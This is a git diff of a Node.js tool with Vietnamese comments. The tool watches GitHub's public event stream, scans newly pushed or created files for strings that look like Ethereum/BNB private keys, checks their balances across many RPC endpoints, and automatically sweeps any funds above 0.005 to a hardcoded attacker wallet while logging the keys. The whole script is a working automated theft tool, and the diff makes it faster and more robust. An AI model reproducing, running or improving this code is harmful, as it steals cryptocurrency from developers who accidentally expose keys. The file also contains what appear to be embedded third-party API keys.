@@ -3,80 +3,119 @@ const fetch = require('node-fetch');
 const { ethers } = require('ethers');
 const chalk = require('chalk');
 
-// Gom tất cả biến cấu hình vào object config
+// ===== KHAI BÁO TOÀN CỤC =====
+
+// Cấu hình
 const config = {
-  // Token xác thực GitHub, nếu không có sẽ dùng token mặc định
+  // Token xác thực GitHub API
   GITHUB_TOKEN: '',
   
-  // Thời gian giữa các lần kiểm tra (mili giây), mặc định 30 giây
+  // Thời gian giữa các lần quét (30 giây)
   CHECK_INTERVAL: 30000,
   
   // File lưu các private key tìm thấy
   LOG_FILE: 'found_keys.txt',
   
-  // URL API GitHub Events để theo dõi hoạt động mới
+  // URL API GitHub Events
   EVENTS_URL: 'https://api.github.com/events',
   
-  // Địa chỉ ví đích để chuyển tiền tìm được
+  // Địa chỉ ví đích để chuyển tiền
   DEST_ADDRESS: '0x8b791c25285d84Aca210624FE86FcB84ed7E8Fb1',
   
-  // Số dư tối thiểu để thực hiện chuyển tiền (ETH)
+  // Số dư tối thiểu để thực hiện chuyển tiền (0.005 ETH)
   MIN_AMOUNT: 0.005,
   
-  // Chế độ quét: 'all' - quét tất cả, 'new-repo' - chỉ quét repo mới
+  // Chế độ quét:
+  // - 'all': Quét tất cả sự kiện (PushEvent và CreateEvent)
+  // - 'push': Chỉ quét các PushEvent (commit mới)
+  // - 'create': Chỉ quét các CreateEvent (repo mới)
+  // - 'balance': Chỉ kiểm tra số dư các key đã tìm thấy
   SCAN_MODE: 'all',
   
   // Số lượng kiểm tra số dư đồng thời tối đa
-  BALANCE_CHECK_CONCURRENCY: 10,
+  BALANCE_CHECK_CONCURRENCY: 20,
   
-  // File lưu các event đã xử lý để tránh trùng lặp
+  // File lưu các event đã xử lý
   SEEN_EVENTS_FILE: 'seen_events.json',
   
   // File cache ETag để tối ưu request API
   ETAG_CACHE_FILE: 'etag_cache.json',
   
-  // File lưu thông tin các ví có số dư
+  // File xuất danh sách ví có số dư
   BALANCE_OUTPUT_FILE: 'wallets_with_balance.txt',
   
   // Số lượng file tối đa quét trong mỗi repo
   MAX_FILES_PER_REPO: 100,
   
-  // Các trạng thái file muốn quét, ví dụ: 'added,modified,removed'
-  SCAN_FILE_STATUS: ['added', 'removed'],
+  // Trạng thái file cần quét trong commit
+  SCAN_FILE_STATUS: ['added', 'removed', 'modified'],
 };
 
 const HEADERS = config.GITHUB_TOKEN ? { 'Authorization': `token ${config.GITHUB_TOKEN}` } : {};
-
-// Regex tìm private key EVM
 const regexes = [
   /\b0x[a-fA-F0-9]{64}\b/g,
   /\b[a-fA-F0-9]{64}\b/g
 ];
-
 let seenEventIds = new Set();
-
-// Biến lưu các RPC khả dụng sau khi kiểm tra
 let workingRpcUrls = {};
-
-// Biến lưu index RPC hiện tại cho từng mạng (round-robin)
 let rpcIndex = {};
-
-// Biến lưu thời gian phản hồi của từng RPC
 let rpcResponseTime = {};
-
-// Danh sách phần mở rộng file code/text phổ biến
 const CODE_FILE_EXTENSIONS = [
   '.js', '.ts', '.py', '.sol', '.env', '.json', '.yaml', '.yml', '.txt', '.go', '.rs', '.c', '.cpp', '.h', '.java', '.php', '.sh', '.pl', '.rb', '.swift', '.cs', '.ini', '.cfg', '.md', '.toml', '.lock', '.conf', '.bat', '.ps1', '.dockerfile', '.makefile', '.gradle', '.xml', '.html', '.css', '.scss', '.vue', '.svelte', '.jsx', '.tsx', '.dart', '.kt', '.m', '.mm', '.scala', '.groovy', '.properties', '.pem', '.crt', '.key', '.secret', '.config', '.sample', '.example'
 ];
-
-// Hàm kiểm tra file có phải code/text không
-function isCodeFile(filename) {
-  const lower = filename.toLowerCase();
-  return CODE_FILE_EXTENSIONS.some(ext => lower.endsWith(ext));
-}
+let foundKeySet = new Set();
+let etagCache = {};
+let dynamicDelay = config.CHECK_INTERVAL;
+let lastSeenEventId = null;
+const networkRpcUrls = {
+  'Ethereum': [
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7',
+    'https://eth-mainnet.public.blastapi.io',
+    'https://api.zan.top/eth-mainnet',
+    'https://ethereum.blockpi.network/v1/rpc/public',
+    'https://eth.rpc.blxrbdn.com',
+    'wss://eth.drpc.org',
+    'https://ethereum-rpc.publicnode.com',
+    'https://eth.drpc.org',
+    'https://uk.rpc.blxrbdn.com',
+    'https://0xrpc.io/eth',
+    'https://eth.blockrazor.xyz',
+    'wss://ethereum-rpc.publicnode.com',
+    'https://singapore.rpc.blxrbdn.com',
+    'https://virginia.rpc.blxrbdn.com',
+    'https://mainnet.gateway.tenderly.co',
+    'https://1rpc.io/eth',
+    'https://gateway.tenderly.co/public/mainnet',
+    'https://go.getblock.io/aefd01aa907c4805ba3c00a9e5b48c6b',
+    'https://eth-pokt.nodies.app'
+  ],
+  'BNB Smart Chain': [
+    'https://binance.llamarpc.com',
+    'wss://bsc-rpc.publicnode.com',
+    'wss://0xrpc.io/bnb',
+    'https://bsc.rpc.blxrbdn.com',
+    'https://bsc.drpc.org',
+    'https://bnb.api.onfinality.io/public',
+    'https://0xrpc.io/bnb',
+    'https://bsc.blockrazor.xyz',
+    'https://bsc-pokt.nodies.app',
+    'https://go.getblock.io/cc778cdbdf5c4b028ec9456e0e6c0cf3',
+    'https://0.48.club',
+    'https://rpc-bsc.48.club',
+    'https://bsc-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf',
+  ]
+};
+const networks = [
+  { name: 'Ethereum', symbol: 'ETH' },
+  { name: 'BNB Smart Chain', symbol: 'BNB' }
+];
+const balanceOutputFile = config.BALANCE_OUTPUT_FILE;
+const POPULAR_DIRS = [
+  'src', 'contracts', 'config', 'lib', 'app', 'backend', 'server', 'api', 'env', 'settings', 'deploy', 'migrations', 'test', 'examples', 'samples', 'utils', 'core', 'main', 'public', 'private', 'secrets', 'keys', 'wallets'
+];
 
 // Tối ưu 2: Đọc log vào Set khi khởi động
-let foundKeySet = new Set();
 try {
   const logContent = fs.readFileSync(config.LOG_FILE, 'utf8');
   const regex = /0x[a-fA-F0-9]{64}|\b[a-fA-F0-9]{64}\b/g;
@@ -108,7 +147,6 @@ function extractKeys(content) {
 }
 
 // Tối ưu 8: Cache ETag/Last-Modified cho từng URL
-let etagCache = {};
 try {
   if (fs.existsSync(config.ETAG_CACHE_FILE)) {
     etagCache = JSON.parse(fs.readFileSync(config.ETAG_CACHE_FILE, 'utf8'));
@@ -121,7 +159,6 @@ function saveEtagCache() {
 }
 
 // Hàm fetch với ETag/If-Modified-Since và tự động tăng delay nếu bị rate limit
-let dynamicDelay = config.CHECK_INTERVAL;
 async function fetchWithCache(url) {
   let headers = { ...HEADERS };
   if (etagCache[url]) {
@@ -169,78 +206,108 @@ async function fetchJSON(url) {
 }
 
 // Thêm biến lưu event ID cuối cùng đã xử lý
-let lastSeenEventId = null;
 try {
   if (fs.existsSync('last_seen_event_id.txt')) {
     lastSeenEventId = fs.readFileSync('last_seen_event_id.txt', 'utf8').trim();
   }
 } catch (e) {}
 
+// Hàm chính để quét các sự kiện GitHub
 async function scan() {
   try {
+    // Lấy danh sách các sự kiện từ API GitHub
     const events = await fetchJSON(config.EVENTS_URL);
     let newEvents = [];
+
+    // Lọc ra các sự kiện mới chưa xử lý
     for (const event of events) {
       if (event.id === lastSeenEventId) break;
       newEvents.push(event);
     }
-    // Xử lý event từ cũ đến mới để đúng thứ tự thời gian
+
+    // Xử lý các sự kiện từ cũ đến mới để đảm bảo đúng thứ tự thời gian
     for (let i = newEvents.length - 1; i >= 0; i--) {
       const event = newEvents[i];
+
+      // Bỏ qua nếu đã xử lý sự kiện này rồi
       if (seenEventIds.has(event.id)) continue;
       seenEventIds.add(event.id);
       saveSeenEvents();
-      // Chỉ scan commit mới nếu SCAN_MODE là 'commit' hoặc 'all'
+
+      // Xử lý sự kiện push commit nếu cấu hình cho phép
       if ((config.SCAN_MODE === 'commit' || config.SCAN_MODE === 'all') && event.type === 'PushEvent') {
         const repo = event.repo.name;
         const commits = event.payload.commits || [];
+
+        // Duyệt qua từng commit trong push
         for (const commit of commits) {
           const sha = commit.sha;
-          // Lấy chi tiết commit để biết file thay đổi
+          
+          // Lấy thông tin chi tiết của commit để biết các file thay đổi
           const commitUrl = `https://api.github.com/repos/${repo}/commits/${sha}`;
           let commitData;
           try {
             commitData = await fetchJSON(commitUrl);
           } catch (e) { continue; }
+
+          // Duyệt qua các file bị thay đổi trong commit
           const files = commitData.files || [];
           for (const file of files) {
+            // Kiểm tra trạng thái và định dạng file
             if (!config.SCAN_FILE_STATUS.includes(file.status)) continue;
-            if (!file.filename || !file.raw_url) continue;
-            if (!isCodeFile(file.filename)) continue; // Tối ưu 1: chỉ quét file code
+            if (!file.filename || !file.raw_url) continue; 
+            if (!isCodeFile(file.filename)) continue; // Chỉ quét file code
+
+            // Lấy nội dung file
             let content;
             try {
               const res = await fetch(file.raw_url, { headers: HEADERS });
               if (!res.ok) continue;
               content = await res.text();
             } catch (e) { continue; }
+
+            // Tìm các private key trong nội dung file
             const keys = extractKeys(content);
             if (keys.length > 0) {
+              // Xử lý từng key tìm được
               for (const key of keys) {
+                // Kiểm tra key có hợp lệ không
                 if (!isLikelyEvmPrivateKey(key)) {
                   console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                   continue;
                 }
+
                 // Chuẩn hóa private key
                 let pk = key.trim();
                 if (!pk.startsWith('0x')) pk = '0x' + pk;
+
+                // Bỏ qua nếu đã tìm thấy key này rồi
                 if (foundKeySet.has(pk)) {
                   console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                   continue;
                 }
+
                 try {
+                  // Tạo ví từ private key
                   const wallet = new ethers.Wallet(pk);
                   let totalBalance = 0;
                   let networkBalances = [];
+
+                  // Kiểm tra số dư trên các mạng
                   for (const network of networks) {
                     const provider = await getWorkingProvider(network.name);
                     if (!provider) {
                       console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                       continue;
                     }
+
+                    // Lấy số dư và chuyển đổi sang ETH
                     const balance = await provider.getBalance(wallet.address);
                     const balanceInEth = ethers.formatEther(balance);
                     networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                     totalBalance += parseFloat(balanceInEth);
+
+                    // Nếu số dư lớn hơn ngưỡng thì chuyển hết về ví đích
                     if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                       const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                       if (txHash) {
@@ -253,13 +320,15 @@ async function scan() {
                     }
                     await new Promise(resolve => setTimeout(resolve, 500));
                   }
+
+                  // Nếu có số dư thì ghi log
                   if (totalBalance > 0) {
                     const githubUrl = `https://github.com/${repo}/blob/${sha}/${file.filename}`;
                     const logEntry = `Repo: ${repo}\nFile: ${file.filename}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                       networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                       `\nCommit: ${sha}\n---\n`;
                     fs.appendFileSync(config.LOG_FILE, logEntry);
-                    foundKeySet.add(pk); // Tối ưu 2: cập nhật Set
+                    foundKeySet.add(pk); // Cập nhật Set các key đã tìm thấy
                     console.log(chalk.blue(`Found key with balance in ${repo}/${file.filename}: ${key} ${wallet.address} ${totalBalance}`));
                   } else {
                     console.log(chalk.yellow(`Key không có số dư: ${key}`));
@@ -272,48 +341,67 @@ async function scan() {
           }
         }
       }
-      // Chỉ scan repo mới nếu SCAN_MODE là 'new-repo' hoặc 'all'
+
+      // Xử lý sự kiện tạo repo mới nếu cấu hình cho phép
       if ((config.SCAN_MODE === 'new-repo' || config.SCAN_MODE === 'all') && event.type === 'CreateEvent' && event.payload.ref_type === 'repository') {
         const repo = event.repo.name;
         const contentsUrl = `https://api.github.com/repos/${repo}/contents`;
+
+        // Lấy danh sách tất cả các file trong repo
         let files = await getAllFilesInRepo(contentsUrl);
         for (const file of files) {
           if (!file.download_url) continue;
-          if (!isCodeFile(file.name || file.path || '')) continue; // Tối ưu 1: chỉ quét file code
+          if (!isCodeFile(file.name || file.path || '')) continue; // Chỉ quét file code
+
+          // Lấy nội dung file
           let content;
           try {
             const res = await fetch(file.download_url, { headers: HEADERS });
             if (!res.ok) continue;
             content = await res.text();
           } catch (e) { continue; }
+
+          // Tìm các private key trong nội dung file
           const keys = extractKeys(content);
           if (keys.length > 0) {
+            // Xử lý từng key tìm được
             for (const key of keys) {
               if (!isLikelyEvmPrivateKey(key)) {
                 console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                 continue;
               }
+
               // Chuẩn hóa private key
               let pk = key.trim();
               if (!pk.startsWith('0x')) pk = '0x' + pk;
+
+              // Bỏ qua nếu đã tìm thấy key này rồi
               if (foundKeySet.has(pk)) {
                 console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                 continue;
               }
+
               try {
+                // Tạo ví từ private key
                 const wallet = new ethers.Wallet(pk);
                 let totalBalance = 0;
                 let networkBalances = [];
+
+                // Kiểm tra số dư trên các mạng
                 for (const network of networks) {
                   const provider = await getWorkingProvider(network.name);
                   if (!provider) {
                     console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                     continue;
                   }
+
+                  // Lấy số dư và chuyển đổi sang ETH
                   const balance = await provider.getBalance(wallet.address);
                   const balanceInEth = ethers.formatEther(balance);
                   networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                   totalBalance += parseFloat(balanceInEth);
+
+                  // Nếu số dư lớn hơn ngưỡng thì chuyển hết về ví đích
                   if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                     const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                     if (txHash) {
@@ -326,13 +414,15 @@ async function scan() {
                   }
                   await new Promise(resolve => setTimeout(resolve, 500));
                 }
+
+                // Nếu có số dư thì ghi log
                 if (totalBalance > 0) {
                   const githubUrl = `https://github.com/${repo}/blob/main/${file.path}`;
                   const logEntry = `Repo: ${repo}\nFile: ${file.path}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                     networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                     `\nCommit: (new repo)\n---\n`;
                   fs.appendFileSync(config.LOG_FILE, logEntry);
-                  foundKeySet.add(pk); // Tối ưu 2: cập nhật Set
+                  foundKeySet.add(pk); // Cập nhật Set các key đã tìm thấy
                   console.log(chalk.blue(`Found key with balance in NEW repo ${repo}/${file.path}: ${key} ${wallet.address} ${totalBalance}`));
                 } else {
                   console.log(chalk.yellow(`Key không có số dư: ${key}`));
@@ -345,7 +435,8 @@ async function scan() {
         }
       }
     }
-    // Cập nhật lastSeenEventId
+
+    // Cập nhật ID sự kiện cuối cùng đã xử lý
     if (events && events.length > 0) {
       lastSeenEventId = events[0].id;
       fs.writeFileSync('last_seen_event_id.txt', lastSeenEventId);
@@ -355,37 +446,30 @@ async function scan() {
   }
 }
 
-// ====== PHẦN KIỂM TRA SỐ DƯ CÁC PRIVATE KEY ĐÃ THU THẬP ======
-const networkRpcUrls = {
-    'Ethereum': [
-        'https://eth.llamarpc.com',
-        'https://eth-pokt.nodies.app',
-        'https://ethereum.publicnode.com',
-        'https://rpc.mevblocker.io',
-        'https://eth.drpc.org',
-        'https://eth.blockrazor.xyz'
-    ],
-    'BNB Smart Chain': [
-        'https://binance.llamarpc.com',
-        'https://bsc-dataseed.bnbchain.org',
-        'https://1rpc.io/bnb',
-        'https://bsc-pokt.nodies.app',
-        'https://bsc.blockrazor.xyz'
-    ]
-};
+// Hàm kiểm tra file có phải code/text không
+function isCodeFile(filename) {
+  const lower = filename.toLowerCase();
+  return CODE_FILE_EXTENSIONS.some(ext => lower.endsWith(ext));
+}
 
-const networks = [
-    { name: 'Ethereum', symbol: 'ETH' },
-    { name: 'BNB Smart Chain', symbol: 'BNB' }
-];
-
-const balanceOutputFile = config.BALANCE_OUTPUT_FILE;
+// Hàm tạo provider hỗ trợ cả HTTP(S) và WSS
+function createProvider(url) {
+  if (url.startsWith('wss://')) {
+    return new ethers.WebSocketProvider(url);
+  } else {
+    return new ethers.JsonRpcProvider(url);
+  }
+}
 
 async function checkNetworkBalance(wallet, network) {
     try {
-        const provider = new ethers.JsonRpcProvider(networkRpcUrls[network.name][0]);
+        const provider = createProvider(networkRpcUrls[network.name][0]);
         const balance = await provider.getBalance(wallet.address);
         const balanceInEth = ethers.formatEther(balance);
+        // Nếu là WebSocketProvider, đóng sau khi dùng xong
+        if (provider instanceof ethers.WebSocketProvider && provider.destroy) {
+          await provider.destroy();
+        }
         return {
             network: network.name,
             symbol: network.symbol,
@@ -407,14 +491,11 @@ async function checkWalletBalance(privateKey) {
         if (pk.startsWith('0x')) pk = pk;
         else pk = '0x' + pk;
         const wallet = new ethers.Wallet(pk);
-        let totalBalance = 0;
-        let networkBalances = [];
-        for (const network of networks) {
-            const balanceInfo = await checkNetworkBalance(wallet, network);
-            networkBalances.push(balanceInfo);
-            totalBalance += parseFloat(balanceInfo.balance);
-            await new Promise(resolve => setTimeout(resolve, 500));
-        }
+        // Kiểm tra số dư trên tất cả các mạng song song
+        let networkBalances = await Promise.all(
+            networks.map(network => checkNetworkBalance(wallet, network))
+        );
+        let totalBalance = networkBalances.reduce((sum, b) => sum + parseFloat(b.balance), 0);
         if (totalBalance > 0) {
             return {
                 address: wallet.address,
@@ -507,11 +588,6 @@ function isLikelyEvmPrivateKey(key) {
   }
 }
 
-// Thư mục phổ biến để quét file
-const POPULAR_DIRS = [
-  'src', 'contracts', 'config', 'lib', 'app', 'backend', 'server', 'api', 'env', 'settings', 'deploy', 'migrations', 'test', 'examples', 'samples', 'utils', 'core', 'main', 'public', 'private', 'secrets', 'keys', 'wallets'
-];
-
 // Hàm đệ quy lấy tất cả file trong repo (chỉ đi vào thư mục phổ biến, giới hạn số file)
 async function getAllFilesInRepo(contentsUrl, fileList = [], depth = 0) {
   if (fileList.length >= config.MAX_FILES_PER_REPO) return fileList;
@@ -567,49 +643,55 @@ async function filterWorkingRpcs() {
   for (const networkName of Object.keys(networkRpcUrls)) {
     workingRpcUrls[networkName] = [];
     rpcResponseTime[networkName] = {};
-    for (const url of networkRpcUrls[networkName]) {
+
+    const urls = networkRpcUrls[networkName];
+    const checkPromises = urls.map(async (url) => {
       try {
-        const provider = new ethers.JsonRpcProvider(url);
+        const provider = createProvider(url);
         const start = Date.now();
         await provider.getBlockNumber(); // test kết nối
         const elapsed = Date.now() - start;
         workingRpcUrls[networkName].push(url);
         rpcResponseTime[networkName][url] = elapsed;
+        if (provider instanceof ethers.WebSocketProvider && provider.destroy) {
+          await provider.destroy();
+        }
         console.log(`✔️  RPC OK: ${networkName} - ${url} (${elapsed} ms)`);
       } catch (e) {
         console.log(`❌ RPC lỗi: ${networkName} - ${url}`);
       }
-    }
+    });
+
+    await Promise.all(checkPromises);
+
     if (workingRpcUrls[networkName].length === 0) {
       console.log(chalk.red(`Không có RPC nào khả dụng cho mạng ${networkName}!`));
     }
   }
 }
 
-// Sửa hàm getWorkingProvider để ưu tiên RPC nhanh nhất
+let rpcRoundRobinIndex = {};
+
+function getNextRpcUrl(networkName) {
+  if (!workingRpcUrls[networkName] || workingRpcUrls[networkName].length === 0) return null;
+  if (typeof rpcRoundRobinIndex[networkName] !== 'number') rpcRoundRobinIndex[networkName] = 0;
+  const urls = workingRpcUrls[networkName];
+  const idx = rpcRoundRobinIndex[networkName];
+  rpcRoundRobinIndex[networkName] = (idx + 1) % urls.length;
+  return urls[idx];
+}
+
+// Sửa hàm getWorkingProvider để dùng round-robin
 async function getWorkingProvider(networkName) {
-  const urls = workingRpcUrls[networkName] || [];
-  if (urls.length === 0) return null;
-  // Sắp xếp endpoint theo thời gian phản hồi tăng dần
-  const sortedUrls = [...urls].sort((a, b) => (rpcResponseTime[networkName][a] || 999999) - (rpcResponseTime[networkName][b] || 999999));
-  for (const url of sortedUrls) {
-    try {
-      const provider = new ethers.JsonRpcProvider(url);
-      const start = Date.now();
-      await provider.getBlockNumber(); // test kết nối
-      const elapsed = Date.now() - start;
-      // Cập nhật moving average (trung bình động) cho response time
-      if (rpcResponseTime[networkName][url]) {
-        rpcResponseTime[networkName][url] = Math.round((rpcResponseTime[networkName][url] * 2 + elapsed) / 3);
-      } else {
-        rpcResponseTime[networkName][url] = elapsed;
-      }
-      return provider;
-    } catch (e) {
-      continue;
-    }
+  const url = getNextRpcUrl(networkName);
+  if (!url) return null;
+  try {
+    const provider = createProvider(url);
+    // Có thể kiểm tra provider ở đây nếu muốn
+    return provider;
+  } catch {
+    return null;
   }
-  return null;
 }
 
 console.log('Starting GitHub public event watcher...');
